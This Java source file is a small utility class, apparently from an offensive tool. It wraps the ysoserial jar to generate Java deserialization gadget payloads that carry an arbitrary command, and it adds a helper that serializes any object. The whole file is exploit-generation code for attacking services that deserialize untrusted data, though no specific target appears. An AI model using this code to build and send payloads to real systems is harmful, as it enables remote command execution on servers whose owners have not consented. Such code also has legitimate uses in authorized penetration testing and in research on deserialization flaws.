package util;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectOutputStream;

public class Ysoserial {
    public static byte[] generate_gadget(String path,String gadget, String command) throws IOException {
        String[] cmd = {"java","-jar",path,gadget,command};
        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] b  = new byte[4096];
        int a = -1;
        while ((a = in.read(b)) != -1){
            baos.write(b,0,a);

        }
        System.out.println(baos.toByteArray());
        return baos.toByteArray();

    }

    public static byte[] serial(Object obj) throws IOException{
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        return bos.toByteArray();
    }
}
